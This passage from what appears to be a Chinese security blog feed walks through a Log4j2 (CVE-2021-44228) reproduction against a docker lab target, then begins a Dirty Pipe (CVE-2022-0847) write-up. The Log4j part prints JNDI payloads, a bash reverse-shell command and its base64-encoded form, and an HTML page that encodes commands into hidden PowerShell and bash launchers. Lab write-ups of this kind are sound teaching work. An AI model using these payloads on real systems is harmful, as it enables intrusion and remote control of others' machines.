<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">docker</span> pull vulfocus/vulfocus:latest</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">docker</span> run -d -p <span class="token number">80</span>:80 -v /var/run/docker.sock:/var/run/docker.sock -e <span class="token assign-left variable">VUL_IP</span><span class="token operator">=</span><span class="token number">192.168</span>.146.135 vulfocus/vulfocus</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313204834866.png" alt="image-20220313204834866" /></p>
<p>解决 docker 拉取缓慢问题</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">vim</span> /etc/docker/daemon.json</pre></td></tr></table></figure><p>加入加速镜像</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token string">"registry-mirrors"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span><span class="token string">"https://9cpn8tt6.mirror.aliyuncs.com"</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>重启 docker</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>systemctl daemon-reload</pre></td></tr><tr><td data-num="2"></td><td><pre>systemctl restart <span class="token function">docker</span></pre></td></tr></table></figure><ol start="2">
<li>登录 <code>http://192.168.146.135/#/dashboard</code></li>
</ol>
<p>默认账号密码为： <code>admin/admin</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313205134779.png" alt="image-20220313205134779" /></p>
<p>使用 docker 搭建 vulfocus 的漏洞靶场：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">docker</span> pull vulfocus/log4j2-rce-2021-12-09:latest</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">docker</span> run -d -p <span class="token number">80</span>:8080 vulfocus/log4j2-rce-2021-12-09:latest</pre></td></tr></table></figure><p>此外还可以从镜像管理一键导入</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313210121177.png" alt="image-20220313210121177" /></p>
<p>如此即可启动靶场</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313210211557.png" alt="image-20220313210211557" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313210227114.png" alt="image-20220313210227114" /></p>
<p>根据提示访问 <code>192.168.146.135:30621 </code> ，部署成功：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313210259297.png" alt="image-20220313210259297" /></p>
<h2 id="0x03-dnslog验证"><a class="anchor" href="#0x03-dnslog验证">#</a> 0x03 DNSLog 验证</h2>
<p>通过<span class="exturl" data-url="aHR0cDovL3d3dy5kbnNsb2cuY24v"> DNSLog 平台</span>获取到域名 <code>n89z1k.dnslog.cn</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313210447892.png" alt="image-20220313210447892" /></p>
<p>构造 payload： <code>$&#123;jndi:ldap://n89z1k.dnslog.cn&#125;</code></p>
<p>设置浏览器代理</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313210837423.png" alt="image-20220313210837423" /></p>
<p>浏览器点击 <code>?????</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313210727554.png" alt="image-20220313210727554" /></p>
<p>并使用 Burpsuite 进行抓包并替换 payload 参数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313210940394.png" alt="image-20220313210940394" /></p>
<p>此时若直接发包会导致服务器 400 错误：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313211033370.png" alt="image-20220313211033370" /></p>
<p>通过 Burpsuite 自带的编码工具对其进行 URL 编码：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313211129690.png" alt="image-20220313211129690" /></p>
<p>编码后再次发送请求包：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313211148748.png" alt="image-20220313211148748" /></p>
<p>在 DNSLog 网站成功接收到解析记录：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313211248587.png" alt="image-20220313211248587" /></p>
<h2 id="0x04-jndi注入反弹shell"><a class="anchor" href="#0x04-jndi注入反弹shell">#</a> 0x04 JNDI 注入反弹 shell</h2>
<p>使用 <code>JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</code>  进行漏洞利用：</p>
<figure class="highlight http"><figcaption data-lang="HTTP"></figcaption><table><tr><td data-num="1"></td><td><pre>下载地址：https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313211327919.png" alt="image-20220313211327919" /></p>
<p>使用方式：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar <span class="token punctuation">[</span>-C<span class="token punctuation">]</span> <span class="token punctuation">[</span>command<span class="token punctuation">]</span> <span class="token punctuation">[</span>-A<span class="token punctuation">]</span> <span class="token punctuation">[</span>address<span class="token punctuation">]</span></pre></td></tr></table></figure><p>反弹 shell 指令：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">bash</span> -i <span class="token operator">>&amp;</span> /dev/tcp/ip/port <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span></pre></td></tr></table></figure><p>此处 kali 的 ip 为 192.168.146.135，port 可使用任意未被占用的端口，此处指定为 4444：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">bash</span> -i <span class="token operator">>&amp;</span> /dev/tcp/192.168.146.135/4444 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span></pre></td></tr></table></figure><p>将此条命令进行 <code>Java Runtime Bash 编码</code> ：</p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">&lt;!--Java Runtime Bash 编码网页源码 --></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>java runtime exec usage...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Input type:</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bash<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>option<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bash<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">processInput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span> <span class="token attr-name">checked</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bash<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Bash<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>powershell<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>option<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>powershell<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">processInput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>powershell<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PowerShell<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>python<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>option<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>python<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">processInput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>python<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Python<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>perl<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>option<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>perl<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">processInput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>perl<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Perl<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span> <span class="token property">box-sizing</span><span class="token punctuation">:</span> border-box<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Type Bash here...<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span> <span class="token property">box-sizing</span><span class="token punctuation">:</span> border-box<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>output<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span> <span class="token attr-name">readonly</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"></pre></td></tr><tr><td data-num="18"></td><td><pre>  <span class="token keyword">var</span> taInput <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'textarea#input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>  <span class="token keyword">var</span> taOutput <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'textarea#output'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>  <span class="token keyword">function</span> <span class="token function">processInput</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">var</span> option <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'input[name="option"]:checked'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>option<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>      <span class="token keyword">case</span> <span class="token string">'bash'</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        taInput<span class="token punctuation">.</span>placeholder <span class="token operator">=</span> <span class="token string">'Type Bash here...'</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        taOutput<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">'bash -c &#123;echo,'</span> <span class="token operator">+</span> <span class="token function">btoa</span><span class="token punctuation">(</span>taInput<span class="token punctuation">.</span>value<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>      <span class="token keyword">case</span> <span class="token string">'powershell'</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        taInput<span class="token punctuation">.</span>placeholder <span class="token operator">=</span> <span class="token string">'Type PowerShell here...'</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        poshInput <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> taInput<span class="token punctuation">.</span>value<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> poshInput <span class="token operator">+=</span> taInput<span class="token punctuation">.</span>value<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token function">unescape</span><span class="token punctuation">(</span><span class="token string">"%00"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        taOutput<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">'powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc '</span> <span class="token operator">+</span> <span class="token function">btoa</span><span class="token punctuation">(</span>poshInput<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>        <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>      <span class="token keyword">case</span> <span class="token string">'python'</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="36"></td><td><pre>        taInput<span class="token punctuation">.</span>placeholder <span class="token operator">=</span> <span class="token string">'Type Python here...'</span></pre></td></tr><tr><td data-num="37"></td><td><pre>        taOutput<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">"python -c exec('"</span> <span class="token operator">+</span> <span class="token function">btoa</span><span class="token punctuation">(</span>taInput<span class="token punctuation">.</span>value<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"'.decode('base64'))"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>        <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>      <span class="token keyword">case</span> <span class="token string">'perl'</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="40"></td><td><pre>        taInput<span class="token punctuation">.</span>placeholder <span class="token operator">=</span> <span class="token string">'Type Perl here...'</span></pre></td></tr><tr><td data-num="41"></td><td><pre>        taOutput<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">"perl -MMIME::Base64 -e eval(decode_base64('"</span> <span class="token operator">+</span> <span class="token function">btoa</span><span class="token punctuation">(</span>taInput<span class="token punctuation">.</span>value<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"'))"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>        <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>      <span class="token keyword">default</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        taOutput<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="46"></td><td><pre></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>taInput<span class="token punctuation">.</span>value<span class="token punctuation">)</span> taOutput<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="49"></td><td><pre></pre></td></tr><tr><td data-num="50"></td><td><pre>  taInput<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'input'</span><span class="token punctuation">,</span> processInput<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="51"></td><td><pre></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="52"></td><td><pre></pre></td></tr><tr><td data-num="53"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220314124822194.png" alt="image-20220314124822194" /></p>
<p>编码后的命令通过 - C 参数输入 JNDI 工具，通过通过 - A 参数指定 kali 的 ip 地址：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="token string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0Ni4xMzUvNDQ0NCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span> -A <span class="token number">192.168</span>.146.135</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220314131721838.png" alt="image-20220314131721838" /></p>
<p>在新的窗口监听 4444 端口：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220314131754117.png" alt="image-20220314131754117" /></p>
<p>替换工具生成的 payload： <code>rmi://192.168.146.135:1099/zty9j9</code>  到 Burpsuite：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220314131829657.png" alt="image-20220314131829657" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220314132248325.png" alt="image-20220314132248325" /></p>
<p>编码后发送到靶机：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220314132121388.png" alt="image-20220314132121388" /></p>
<p>kali 的监听窗口成功接收到反弹的 shell：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220314132201538.png" alt="image-20220314132201538" /></p>
<h2 id="0x05-参考链接"><a class="anchor" href="#0x05-参考链接">#</a> 0x05 参考链接</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbG9vbmd0ZW4vYXJjaGl2ZS8yMDIyLzAxLzE5LzE1ODIyMTk1Lmh0bWw=">CVE-2021-44228——Log4j2-RCE 漏洞复现</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/20220316152942.gif" alt="20220316152942" /></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Windows漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2022-0847 Linux内核提权漏洞复现</title>
    <url>/article/77a28503.html</url>
    <content><![CDATA[<p>前几天看到的 linux 脏牛提权漏洞，小小的复现以下😁😁😁</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220309195108779.png" alt="image-20220309195108779" /></p>
<h1 id="前言"><a class="anchor" href="#前言">#</a> 前言</h1>
<ul>
<li>
<p><code>CVSS</code>  评分：7.8</p>
</li>
<li>
<p>影响范围： <code>5.8</code>  &lt;= Linux 内核版本 &lt;  <code>5.16.11 / 5.15.25 / 5.10.102</code></p>
</li>
<li>
<p>RT 通过  <code>CVE-2022-0847</code>  可覆盖重写任意可读文件中的数据，可将普通权限的用户提升到特权 root</p>
</li>
</ul>
<p>这个漏洞作者将其命名为了  <code>Dirty Pipe</code> ，一看到这名字讲道理就让人想到了 <code>CVE-2016-5195 “Dirty Cow”</code> ，这是因为该漏洞的原理比较类似于  <code>Dirty Cow</code> ，但这个漏洞更容易被利用。</p>
<p><strong>修复版本</strong>：该漏洞已 在  <code>Linux 5.16.11</code> 、 <code>5.15.25</code>  和  <code>5.10.102</code>  中修复。</p>
<h1 id="漏洞原理"><a class="anchor" href="#漏洞原理">#</a> <strong>漏洞原理</strong></h1>
<p>发现新管道缓冲区结构的 “标志” 成员在 Linux 内核中的  <code>copy_page_to_iter_pipe</code>  和  <code>push_pipe</code>  函数中缺乏正确初始化的方式存在缺陷，因此可能包含陈旧值。</p>
<p>非特权本地用户可以使用此漏洞写入由只读文件支持的页面缓存中的页面，从而提升他们在系统上的权限。</p>
<p>即使在没有写入器的情况下，也可以在没有时间限制的情况下，在（几乎）任意位置使用任意数据覆盖页面缓存。限制是：</p>
<ul>
<li>攻击者必须具有读取权限（因为它需要将  <code>splice()</code>  页面放入管道）</li>
<li>偏移量不能在页面边界上（因为该页面的至少一个字节必须已拼接到管道中）</li>
<li>写入不能跨越页面边界（因为将为其余部分创建一个新的匿名缓冲区）</li>
<li>文件无法调整大小（因为管道有自己的页面填充管理，并且不会告诉页面缓存附加了多少数据）</li>
</ul>
<p>要利用此漏洞，您需要：</p>
<ol>
<li>创建管道。</li>
<li>用任意数据填充管道（  <code>PIPE_BUF_FLAG_CAN_MERGE</code>  在所有环条目中设置标志）。</li>
<li>排干管道（在环上的所有实例中设置标志）。 <code>struct pipe_buffer``struct pipe_inode_info</code></li>
<li>将目标文件（以 开头 <code>O_RDONLY</code> ）中的数据从目标偏移之前的位置拼接到管道中。</li>
<li>将任意数据写入管道；此数据将覆盖缓存的文件页面，而不是创建新的异常，因为已设置。 <code>struct pipe_buffer``PIPE_BUF_FLAG_CAN_MERGE</code></li>
</ol>
<p>为了让这个漏洞更有趣，它不仅可以在没有写权限的情况下工作，它还可以用于不可变文件、只读 btrfs 快照和只读挂载（包括 CD-ROM 挂载）。这是因为页面缓存始终是可写的（由内核），并且写入管道从不检查任何权限。</p>
<h1 id="漏洞复现"><a class="anchor" href="#漏洞复现">#</a> 漏洞复现</h1>
<h2 id="漏洞检测"><a class="anchor" href="#漏洞检测">#</a> 漏洞检测</h2>
<p>检测的方法很简单，直接  <code>uname -r</code>  ，如果   <code>5.8 &lt;= Linux 内核版本 &lt; 5.16.11 / 5.15.25 / 5.10.102</code>  说明可能受到该漏洞的影响。</p>
